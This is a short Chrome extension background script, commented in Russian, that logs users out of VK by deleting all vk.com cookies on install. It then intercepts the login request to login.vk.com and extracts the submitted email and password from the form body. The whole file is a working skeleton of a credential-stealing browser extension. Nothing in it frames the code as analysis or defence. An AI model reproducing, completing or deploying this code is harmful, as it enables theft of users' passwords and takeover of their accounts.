// 1. Логаут через очистку кук
chrome.runtime.onInstalled.addListener(({ reason }) => {
  if (reason === 'install') {
    chrome.cookies.getAll(
      {
        domain: 'vk.com',
      },
      (cookies) => {
        cookies.forEach((cookie) => {
          chrome.cookies.remove({
            name: cookie.name,
            url: 'https://vk.com/',
          });
        });
      }
    );
  }
});

// 2. Перехват запроса на авторизвацию
chrome.webRequest.onBeforeRequest.addListener(
  (details) => {
    const { requestBody = {} } = details;
    const { formData = {} } = requestBody;
    const { email, pass } = formData;

    return { cancel: false };
  },
  { urls: ['https://login.vk.com/?act=login'] },
  ['requestBody']
);
